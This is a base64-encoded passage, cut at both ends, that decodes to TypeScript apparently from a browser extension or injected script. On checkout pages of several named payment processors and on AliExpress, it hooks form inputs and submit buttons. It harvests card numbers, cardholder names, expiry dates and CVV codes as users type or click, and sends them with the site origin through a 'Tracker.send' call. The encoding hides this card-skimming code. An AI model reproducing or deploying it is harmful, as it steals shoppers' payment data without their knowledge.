J2RvY21vcnJpcycpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVEb2Ntb3JyaXNQYXltZW50Q29udGFpbmVyKHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ3NlZ3BheScpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmV4cGxvcmVTZWdQYXlQYXltZW50Q29udGFpbmVyKHNlbGYpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH0sIDEwMCk7XHJcbiAgICAgICAgICAgIH1cclxuXHJcbiAgICAgICAgICAgIGlmICh3aW5kb3cubG9jYXRpb24ub3JpZ2luLmluZGV4T2YoJ2NjYmlsbCcpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICAgICAgbGV0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdmb3JtJykubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI3B1cmNoYXNlRm9ybScpICE9PSBudWxsICYmIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy5wYXlfYnknKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNwbGFjZU9yZGVyJykgYXMgSFRNTEFuY2hvckVsZW1lbnQpLmFkZEV2ZW50TGlzdGVuZXIoJ2NsaWNrJywgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJy53YWxsZXRfcGF5bWVudF9vcHRpb25zLnR3by1jb2x1bW4tbGF5b3V0LXdhbGxldC1wYXltZW50LW9wdGlvbnMnKT8ucmVtb3ZlKCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgVHJhY2tlci5zZW5kKHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZE51bWJlcic6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY3JlZGl0Q2FyZE51bScpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlICE9PSBudWxsID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjcmVkaXRDYXJkTnVtJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogLypwYXltZW50TWV0aG9kRGF0YVsyXS52YWx1ZSA/IHBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlLnRvTG93ZXJDYXNlKCkgOiovICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNmaXJzdE5hbWUnKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjZmlyc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicgKyAnICcgKyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xhc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgIT09IG51bGwgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xhc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEV4cGlyZSc6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2FyZEV4cGlyYXRpb25Nb250aCcpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlICE9PSBudWxsID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjYXJkRXhwaXJhdGlvbk1vbnRoJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicgKyAnLycgKyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NhcmRFeHBpcmF0aW9uWWVhcicpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlICE9PSBudWxsID8gKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjYXJkRXhwaXJhdGlvblllYXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjdnYyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgIT09IG51bGwgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2N2djInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9lbGVtZW50cyA9IFtdO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9LCAxMDApO1xyXG4gICAgICAgICAgICB9XHJcblxyXG4gICAgICAgICAgICBpZiAod2luZG93LmxvY2F0aW9uLm9yaWdpbi5pbmRleE9mKCdvcHB3YS5jb20nKSAhPT0gLTEpIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwxKTtcclxuICAgICAgICAgICAgICAgIGxldCBpbnRlcnZhbCA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2Zvcm0nKSBhcyBIVE1MRm9ybUVsZW1lbnQpLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdmb3JtJykgYXMgSFRNTEZvcm1FbGVtZW50KS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PT0gJ2lucHV0JyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkudHlwZSA9PT0gJ3RlbCcpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGludGVydmFsKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBbJ2tleXVwJywgJ2tleWRvd24nLCAnY2hhbmdlJywgJ3Bhc3RlJ10uZm9yRWFjaChmdW5jdGlvbiAoX19ldmVudCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2NoaWxkRWxlbWVudC5hZGRFdmVudExpc3RlbmVyKF9fZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29tbWFuZDogJ3NhdmVQYXltZW50TWV0aG9kc0RhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkuZ2V0QXR0cmlidXRlKCdhcmlhLWxhYmVsJykgPT09ICdDYXJkIE51bWJlcicgPyAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQnJhbmQnOiAvKnBheW1lbnRNZXRob2REYXRhWzJdLnZhbHVlID8gcGF5bWVudE1ldGhvZERhdGFbMl0udmFsdWUudG9Mb3dlckNhc2UoKSA6Ki8gJ1Vua25vd24nLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEhvbGRlcic6IC8qKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNmaXJzdE5hbWUnKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjZmlyc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicgKyAnICcgKyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xhc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgIT09IG51bGwgPyAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2xhc3ROYW1lJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiovICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignI2NhcmRFeHBpcmF0aW9uTW9udGgnKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2FyZEV4cGlyYXRpb25Nb250aCcpIGFzIEhUTUxJbnB1dEVsZW1lbnQpLnZhbHVlIDogJ1Vua25vd24nICsgJy8nICsgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJyNjYXJkRXhwaXJhdGlvblllYXInKSBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSAhPT0gbnVsbCA/IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjY2FyZEV4cGlyYXRpb25ZZWFyJykgYXMgSFRNTElucHV0RWxlbWVudCkudmFsdWUgOiAnVW5rbm93bicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkQ1ZDJzogKF9fY2hpbGRFbGVtZW50IGFzIEhUTUxJbnB1dEVsZW1lbnQpLmdldEF0dHJpYnV0ZSgnYXJpYS1sYWJlbCcpID09PSAnQ1ZWJyA/IChfX2NoaWxkRWxlbWVudCBhcyBIVE1MSW5wdXRFbGVtZW50KS52YWx1ZSA6ICdVbmtub3duJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2V2ZW50JzogJ2FkZCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd3b3JrV2Vic2l0ZSc6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSwgMTAwKTtcclxuXHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9LCAxMDAwKTtcclxuICAgIH1cclxuXHJcbiAgICBleHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGY6IHRoaXMsIF9fZWxlbWVudFBhcmVudDogYW55LCBfX3RhZ05hbWU6IHN0cmluZywgX19xdWVyeTogc3RyaW5nLCBjYWxsYmFjaz86IGFueSkge1xyXG4gICAgICAgIGlmIChfX2VsZW1lbnRQYXJlbnQuY2hpbGROb2Rlcy5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgX19lbGVtZW50UGFyZW50LmNoaWxkTm9kZXMuZm9yRWFjaChmdW5jdGlvbiAoX19jaGlsZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgaWYgKF9fY2hpbGRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCkgPT09IF9fdGFnTmFtZSkge1xyXG4gICAgICAgICAgICAgICAgICAgIFsuLi5fX2NoaWxkRWxlbWVudC5hdHRyaWJ1dGVzXS5mb3JFYWNoKGZ1bmN0aW9uIChhdHRyaWJ1dGUpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGF0dHJpYnV0ZS5ub2RlVmFsdWUudG9Mb3dlckNhc2UoKS5pbmRleE9mKF9fcXVlcnkpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY2FsbGJhY2soX19jaGlsZEVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfSlcclxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XHJcbiAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIF9fY2hpbGRFbGVtZW50LCBfX3RhZ05hbWUsIF9fcXVlcnksIGNhbGxiYWNrKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIGV4cGxvcmVBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZjogdGhpcywgX19lbGVtZW50UGFyZW50OiBIVE1MRWxlbWVudCwgY2FsbGJhY2s/OiBhbnkpIHtcclxuICAgICAgICBsZXQgZGV0ZWN0ZWRFbGVtZW50czogYW55ID0gW107XHJcbiAgICAgICAgaWYgKF9fZWxlbWVudFBhcmVudC5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBfX2VsZW1lbnRQYXJlbnQuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX2NoaWxkRWxlbWVudCkge1xyXG4gICAgICAgICAgICAgICAgaWYgKChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2xhc3NMaXN0LmNvbnRhaW5zKCdjYXJkLXN1cmZhY2UnKSkge1xyXG4gICAgICAgICAgICAgICAgICAgIGlmICgoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLm5vZGVOYW1lID09PSAnRElWJyAmJiAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNoaWxkTm9kZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIChfX2NoaWxkRWxlbWVudCBhcyBIVE1MRWxlbWVudCkuY2hpbGROb2Rlcy5mb3JFYWNoKGZ1bmN0aW9uIChfX3RhcmdldFBhcmVudEVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgoX190YXJnZXRQYXJlbnRFbGVtZW50IGFzIEhUTUxFbGVtZW50KS5jbGFzc0xpc3QuY29udGFpbnMoJ2NhcmQtbm8nKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX3RhcmdldFBhcmVudEVsZW1lbnQsICdpbnB1dCcsICdjYXJkbicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKChfX3RhcmdldFBhcmVudEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLmNsYXNzTGlzdC5jb250YWlucygnY2FyZC1ib3R0b20nKSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX3RhcmdldFBhcmVudEVsZW1lbnQsICdpbnB1dCcsICdjYXJkaG9sZGVyJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZnVuY3Rpb24gKGRldGVjdGVkRWxlbWVudDogYW55KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkZXRlY3RlZEVsZW1lbnRzLnB1c2goZGV0ZWN0ZWRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5leHBsb3JlU3BlY2lmaWNFbGVtZW50QnlUYWdOYW1lKHNlbGYsIF9fdGFyZ2V0UGFyZW50RWxlbWVudCwgJ2lucHV0JywgJ2V4cGlyZScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZXhwbG9yZVNwZWNpZmljRWxlbWVudEJ5VGFnTmFtZShzZWxmLCBfX3RhcmdldFBhcmVudEVsZW1lbnQsICdpbnB1dCcsICdjdicsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZ1bmN0aW9uIChkZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZGV0ZWN0ZWRFbGVtZW50cy5wdXNoKGRldGVjdGVkRWxlbWVudCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICBpZiAoY2FsbGJhY2spIHtcclxuICAgICAgICAgICAgICAgICAgICBjYWxsYmFjayhkZXRlY3RlZEVsZW1lbnRzKTtcclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfVxyXG4gICAgfVxyXG5cclxuICAgIHByb2Nlc3NBbGlFeHByZXNzUGF5bWVudE5ld0NhcmQoc2VsZjogdGhpcykge1xyXG4gICAgICAgIHNlbGYuZXhwbG9yZUFsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmLFxyXG4gICAgICAgICAgICAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLm5ldy1jYXJkJykgYXMgSFRNTEVsZW1lbnQpLFxyXG4gICAgICAgICAgICBmdW5jdGlvbiAoZWxlbWVudHM6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgbGV0IHBheW1lbnRNZXRob2RTdG9yZTogYW55ID0gW107XHJcbiAgICAgICAgICAgICAgICBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuc2F2ZScpPy5hZGRFdmVudExpc3RlbmVyKCdjbGljaycsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICBuZXcgU2V0KGVsZW1lbnRzKS5mb3JFYWNoKGZ1bmN0aW9uIChlbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlLnB1c2goe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2VsZW1lbnQnOiBlbGVtZW50Lm5vZGVOYW1lLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2lkJzogZWxlbWVudC5pZCxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogZWxlbWVudC50eXBlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3ZhbHVlJzogZWxlbWVudC52YWx1ZVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9KVxyXG4gICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlUGF5bWVudE1ldGhvZHNEYXRhJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgZGF0YToge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmROdW1iZXInOiBwYXltZW50TWV0aG9kU3RvcmVbMF0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZEJyYW5kJzogZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtdHlwZS1pY29uLmljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCd2aXNhJykgPyAndmlzYScgOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtdHlwZS1pY29uLmljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdtYXN0ZXJjYXJkJykgPyAnbWFzdGVyY2FyZCcgOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtdHlwZS1pY29uLmljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdkaXNjb3ZlcicpID8gJ2Rpc2NvdmVyJyA6IChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc0xpc3QuY29udGFpbnMoJ21ucCcpID8gJ21ucCcgOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtdHlwZS1pY29uLmljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdtYWVzdHJvJykgPyAnbWFlc3RybycgOiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmNhcmQtdHlwZS1pY29uLmljb24nKT8uY2xhc3NMaXN0LmNvbnRhaW5zKCdhbWV4JykgPyAnYW1leCcgOiBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcuY2FyZC10eXBlLWljb24uaWNvbicpPy5jbGFzc05hbWUpKSkpKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdjYXJkSG9sZGVyJzogcGF5bWVudE1ldGhvZFN0b3JlWzFdLnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ2NhcmRFeHBpcmUnOiBwYXltZW50TWV0aG9kU3RvcmVbMl0udmFsdWUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAnY2FyZENWQyc6IHBheW1lbnRNZXRob2RTdG9yZVszXS52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICdldmVudCc6ICdhZGQnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3dvcmtXZWJzaXRlJzogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgcGF5bWVudE1ldGhvZFN0b3JlID0gW107XHJcblxyXG4gICAgICAgICAgICAgICAgICAgIGxldCBlZGl0ID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtY2FyZCcpICE9PSBudWxsKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBjbGVhckludGVydmFsKGVkaXQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgWydjbGljaycsICdkYmxjbGljayddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvcignLmVkaXQtY2FyZCcpPy5hZGRFdmVudExpc3RlbmVyKGV2ZW50LCBmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBfX2ludGVydmFsMyA9IHNldEludGVydmFsKGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcubmV3LWNhcmQnKSAhPT0gbnVsbCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoX19pbnRlcnZhbDMpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYucHJvY2Vzc0FsaUV4cHJlc3NQYXltZW50TmV3Q2FyZChzZWxmKTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSwgMTAwMCk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgIH0sIDEwMDApO1xyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH1cclxuICAg